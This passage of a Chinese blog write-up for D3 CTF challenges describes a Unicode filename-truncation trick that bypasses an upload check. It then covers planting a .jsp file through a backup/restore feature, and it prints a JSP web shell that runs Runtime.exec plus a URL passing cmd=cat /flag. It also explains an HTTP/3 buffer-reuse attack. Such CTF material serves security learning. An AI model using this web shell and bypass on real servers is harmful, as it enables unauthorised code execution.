class="hljs-string">f&quot;U+<span class="hljs-subst">&#123;code_point:04X&#125;</span>&quot;</span>, char, name))<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> candidates<br><br>ascii_character = <span class="hljs-string">&quot;j&quot;</span>  <span class="hljs-comment"># 可替换为&quot;s&quot;或&quot;p&quot;</span><br>byte_val = <span class="hljs-built_in">ord</span>(ascii_character)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible original characters (<span class="hljs-subst">&#123;byte_val&#125;</span> → 0x<span class="hljs-subst">&#123;byte_val &amp; <span class="hljs-number">0xFF</span>:02X&#125;</span>):&quot;</span>)<br>results = reverse_search(byte_val)<br><span class="hljs-keyword">for</span> cp, char, name <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;cp&#125;</span>: <span class="hljs-subst">&#123;char&#125;</span> - <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>脚本会列出所有低字节为<code>0x6A</code>的 Unicode 字符，如<code>U+006A</code>（’j’ 本身）、<code>U+016A</code>（’Ǫ’）、<code>U+026A</code>（’ɪ’）等，其中部分字符可能绕过上传校验。</p>
+<p>  <strong>上传与利用备份功能</strong>：</p>
+<ul>
+<li><p>将构造的文件上传至系统（可能通过文件上传接口或其他方式）</p>
+</li>
+<li><p>利用备份功能触发 jtar 打包，文件名中的 Unicode 字符被截断为<code>.jsp</code></p>
+</li>
+<li><p>恢复备份时，文件被写入 JSP 解析目录</p>
+<p>  最后访问rce</p>
+<p>  110.42.47.146:7777&#x2F;view?page&#x3D;712ea348-98fd-497f-ab94-3af428f9e052&amp;cmd&#x3D;cat &#x2F;flag</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/%E5%9B%BE%E7%89%87/9d51446618ba51c76ec67d8d48022af.png" srcset="/img/loading.gif" lazyload alt="9d51446618ba51c76ec67d8d48022af"></p>
+<p>jsp格式的木马</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; <br>&lt;% <br><span class="hljs-title class_">String</span> cmd = <span class="hljs-string">&quot;printenv&quot;</span>; <br><span class="hljs-title class_">String</span> output = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">try</span> &#123; <br> <br> <br>        <span class="hljs-title class_">Process</span> p = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd); <br>        <span class="hljs-title class_">BufferedReader</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <br><span class="hljs-title class_">InputStreamReader</span>(p.<span class="hljs-title function_">getInputStream</span>())); <br>        <span class="hljs-title class_">String</span> line; <br>        <span class="hljs-keyword">while</span> ((line = reader.<span class="hljs-title function_">readLine</span>()) != <span class="hljs-literal">null</span>) &#123; <br>            output += line + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <br>        &#125; <br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123; <br>        output = <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(); <br>    &#125; <br>%&gt; <br> <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Command Output<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Executed Command: <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>&lt;%= cmd %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&lt;%= output %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>cmd实现命令执行</p>
+<h2 id="4-D3-tidy-quic"><a href="#4-D3-tidy-quic" class="headerlink" title="4.D3 tidy quic"></a>4.D3 tidy quic</h2><h3 id="该-Go-脚本的核心思路与代码逻辑详解（基于-HTTP-3-缓冲区污染攻击）"><a href="#该-Go-脚本的核心思路与代码逻辑详解（基于-HTTP-3-缓冲区污染攻击）" class="headerlink" title="该 Go 脚本的核心思路与代码逻辑详解（基于 HTTP&#x2F;3 缓冲区污染攻击）"></a>该 Go 脚本的核心思路与代码逻辑详解（基于 HTTP&#x2F;3 缓冲区污染攻击）</h3><h3 id="一、攻击背景：HTTP-3-缓冲区污染漏洞"><a href="#一、攻击背景：HTTP-3-缓冲区污染漏洞" class="headerlink" title="一、攻击背景：HTTP&#x2F;3 缓冲区污染漏洞"></a><strong>一、攻击背景：HTTP&#x2F;3 缓冲区污染漏洞</strong></h3><p>HTTP&#x2F;3 基于 QUIC 协议，服务器在处理请求时可能<strong>重复使用同一块内存缓冲区</strong>（Buffer Pool）来存储不同请求的数据。若两次请求的 <code>Content-Length</code>（内容长度）相同，服务器会分配同一块固定大小的缓冲区。此时：</p>
+<ul>
+<li><strong>第一次请求</strong>：在缓冲区中写入数据（如包含 <code>&quot;flag&quot;</code> 的字符串）。</li>
+<li><strong>第二次请求</strong>：覆盖缓冲区的前半部分，与第一次残留的 <code>&quot;flag&quot;</code> 拼接成特定字符串（如 <code>&quot;I want flag&quot;</code>），触发服务器的敏感逻辑（如返回 flag）。</li>
+</ul>
+<h3 id="二、脚本核心思路拆解"><a href="#二、脚本核心思路拆解" class="headerlink" title="二、脚本核心思路拆解"></a><strong>二、脚本核心思路拆解</strong></h3><p>该脚本通过两次 HTTP&#x2F;3 POST 请求，利用缓冲区重用机制，拼接出服务器预期的字符串，最终获取 flag。以下是关键步骤的详细解释：</p>
+<p><img src="/%E5%9B%BE%E7%89%87/image-20250608151105334.png" srcset="/img/loading.gif" lazyload alt="image-20250608151105334"></p>
+<p><img src="/%E5%9B%BE%E7%89%87/image-20250608151144852.png" srcset="/img/loading.gif" lazyload alt="image-20250608151144852"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://fearless-123.github.io/2025/06/11/D3 CTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>fearless123</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 11, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
